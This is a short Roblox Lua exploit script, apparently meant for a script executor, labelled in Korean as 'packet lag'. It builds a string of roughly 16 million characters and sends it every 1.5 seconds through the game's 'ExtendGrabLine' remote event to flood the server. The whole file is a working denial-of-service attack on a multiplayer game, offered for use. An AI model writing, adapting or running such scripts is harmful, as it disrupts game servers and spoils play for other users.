local StarterGui = game:GetService("StarterGui")

if getgenv().PacketLag then
    StarterGui:SetCore("SendNotification", {
        Title = "[ ⚠️알림 ]",
        Text = "이미 켜져있음",
        Duration = 3,
    })
    return
end

getgenv().PacketLag = true

StarterGui:SetCore("SendNotification", {
    Title = "[ 🟢패킷렉 시작 ]",
    Text = "켜짐",
    Duration = 3,
})

local base = "Balls Balls Balls Balls Balls Balls Balls Balls Balls Balls Balls Balls Balls Balls Balls Balls Balls Balls Balls Balls "
local hugeString = base:rep(160000)
local args = {
    [1] = hugeString
}

task.spawn(function()
    while getgenv().PacketLag do
        game:GetService("ReplicatedStorage"):WaitForChild("GrabEvents"):WaitForChild("ExtendGrabLine"):FireServer(unpack(args))
        task.wait(1.5)
    end
end)
